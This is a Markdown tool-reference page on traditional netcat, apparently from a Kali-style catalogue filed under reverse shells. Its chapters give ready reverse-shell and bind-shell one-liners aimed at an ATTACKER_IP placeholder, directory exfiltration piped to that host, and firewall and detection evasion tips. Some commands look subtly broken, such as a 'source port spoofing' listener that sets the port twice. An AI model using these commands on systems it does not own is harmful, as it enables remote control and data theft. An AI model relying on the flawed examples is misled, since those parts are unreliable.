---
title: "netcat - TCP/IP Swiss Army Knife"
description: "Classic network utility for reading and writing data across network connections using TCP or UDP"
category: "reverse_shells"
mitre_tactic: command_and_control
mitre_tactic_id: TA0011
package: "netcat-traditional"
kali_install: "sudo apt install netcat-traditional"
version: "1.10"
---

# netcat

## Overview

netcat is the original TCP/IP swiss army knife, written by Hobbit. It reads and writes data across network connections using TCP or UDP protocol. Despite its simplicity, netcat is a powerful tool for network debugging, exploration, and creating reverse shells. The traditional version included in Kali Linux provides essential networking capabilities without the additional features found in ncat.

## Chapter 1: Installation

### Kali Linux

```bash
sudo apt install netcat-traditional
```

### Verify Installation

```bash
nc.traditional -h
```

## Chapter 2: Basic Usage

### Listen for Connections

```bash
nc -lvnp 4444
```

**Explanation**: `-l` enables listen mode, `-v` provides verbose output, `-n` skips DNS resolution, `-p` specifies the port. netcat waits for an incoming TCP connection on port 4444.

### Connect to Remote Host

```bash
nc 192.168.1.100 4444
```

**Explanation**: Initiates a TCP connection to the specified host and port. Once connected, both sides can send and receive data interactively.

### UDP Mode

```bash
nc -u -lvnp 4444
```

**Explanation**: The `-u` flag switches to UDP mode. UDP connections do not establish a formal handshake, making them connectionless. This affects reliability but can be useful for certain network scenarios.

## Chapter 3: Reverse Shells

### Bash Reverse Shell

```bash
# Attacker
nc -lvnp 4444

# Target
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Explanation**: The target initiates an outbound connection to the attacker's listener. Bash I/O is redirected through the TCP connection, providing an interactive shell on the attacker's terminal.

### Netcat with -e Flag

```bash
# Attacker
nc -lvnp 4444

# Target (netcat-traditional supports -e)
nc ATTACKER_IP 4444 -e /bin/bash
```

**Explanation**: The `-e` flag executes `/bin/bash` and connects its standard input/output/error to the network connection. This is only available in netcat-traditional, not netcat-openbsd.

### Netcat with FIFO

```bash
# Target
mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
```

**Explanation**: A named pipe (FIFO) is created to separate input and output streams. Commands typed on the attacker's side are sent to the shell, and output flows back through the pipe. This works with both netcat variants.

## Chapter 4: Bind Shells

### Bind Shell (Target as Server)

```bash
# Target
nc -lvnp 4444 -e /bin/bash

# Attacker
nc 192.168.1.100 4444
```

**Explanation**: The target listens for connections and provides a shell when connected. The attacker connects to the target. This approach is less common because it requires the target to accept inbound connections, which firewalls typically block.

## Chapter 5: File Transfer

### Send File

```bash
# Receiver
nc -lvnp 4444 > received_file

# Sender
nc 192.168.1.100 4444 < file_to_send
```

**Explanation**: Data from the sender's file is transmitted over the TCP connection and saved to the receiver's file. This method transfers files through a single TCP connection, avoiding HTTP-based detection.

### Transfer Directory

```bash
# Sender
tar czf - /path/to/directory | nc ATTACKER_IP 4444

# Receiver
nc -lvnp 4444 | tar xzf -
```

**Explanation**: The directory is compressed with tar and piped through the network connection. The receiver decompresses and extracts the files. This maintains directory structure and permissions.

## Chapter 6: Port Scanning

### TCP Port Scan

```bash
nc -zv 192.168.1.1 1-1000
```

**Explanation**: The `-z` flag enables zero-I/O mode for scanning without data transfer. This scans TCP ports 1 through 1000, reporting open ports. This is a basic scan and does not detect filtered ports reliably.

### Port Scan with Timeout

```bash
nc -zv -w 2 192.168.1.1 21-25 80 443
```

**Explanation**: The `-w 2` flag sets a 2-second timeout for each connection attempt. This prevents hanging on unresponsive ports and speeds up scanning.

## Chapter 7: Chat and Banner Grabbing

### Chat Server

```bash
# Server
nc -lvnp 4444

# Client
nc 192.168.1.100 4444
```

**Explanation**: Without command execution or file redirection, netcat provides a bidirectional text communication channel. Both sides type messages that appear on the other side's terminal.

### HTTP Banner Grabbing

```bash
nc 192.168.1.1 80
GET / HTTP/1.1
Host: 192.168.1.1

```

**Explanation**: Connect to a web server and manually send an HTTP request. The server's response reveals the web server software, version, and other identifying information.

### SMTP Banner Grabbing

```bash
nc 192.168.1.1 25
EHLO test
```

**Explanation**: Connect to an SMTP server and send an EHLO command. The server responds with its capabilities, revealing the mail server software and supported features.

## Chapter 8: Advanced Techniques

### Persistent Listener

```bash
nc -lvnp 4444 -k
```

**Explanation**: The `-k` flag keeps netcat listening after a client disconnects. This allows multiple sequential connections without restarting the listener. Useful for accepting multiple reverse shells.

### Randomized Ports

```bash
nc -l -p 0
```

**Explanation**: Specifying port 0 causes the OS to assign a random available port. This can be useful for evading port-based detection, though the port must be communicated to the connecting party.

### Source Port Spoofing

```bash
nc -p 53 -lvnp 4444
```

**Explanation**: Spoofing the source port as 53 (DNS) may bypass some firewall rules. Some network devices trust DNS traffic and may allow it through even with restrictive ACLs.

### Connection Relay

```bash
nc -lvnp 4444 | nc TARGET_IP 5555
```

**Explanation**: Pipes data between a local listener and a remote host. Connections to port 4444 are forwarded to port 5555 on the target, creating a simple port forwarding mechanism.

## Resources

- [netcat Homepage](http://www.stearns.org/nc/)
- [Kali Linux netcat Page](https://www.kali.org/tools/netcat/)
- [netcat man page](https://linux.die.net/man/1/nc)
- [Debian netcat Package](https://packages.debian.org/netcat-traditional)
